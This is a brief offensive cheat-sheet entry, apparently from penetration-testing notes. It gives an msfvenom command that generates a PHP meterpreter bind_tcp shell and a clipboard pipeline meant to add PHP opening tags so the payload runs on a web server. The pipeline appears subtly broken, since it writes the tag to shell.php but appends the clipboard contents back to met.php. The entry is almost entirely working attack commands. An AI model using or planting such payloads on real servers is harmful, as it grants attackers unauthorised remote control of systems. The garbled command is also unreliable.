# PHP

- PHP meterpreter bind callback shell

`$ msfvenom -p php/meterpreter/bind_tcp lport=<PORT> -f raw > met.php`

- After generating the PHP meterpreter bind callback shell include the tags to ensure execution.

```
$ cat met.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> met.php
```